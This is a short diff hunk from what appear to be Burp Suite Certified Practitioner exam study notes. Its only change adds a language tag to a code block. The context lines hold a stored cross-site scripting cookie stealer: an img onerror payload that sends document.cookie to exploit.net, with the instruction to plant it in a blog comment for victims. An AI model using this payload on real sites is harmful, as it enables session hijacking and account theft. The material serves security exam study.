@@ -7,7 +7,7 @@ Burp Suite Certified Practitioner Exam Study Notes
 ### Cookie Stealers
 
 **Place payload in blog post comment section for victim to visit and send cookie.**
-```
+```html
 <img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
 ```
 <picture>
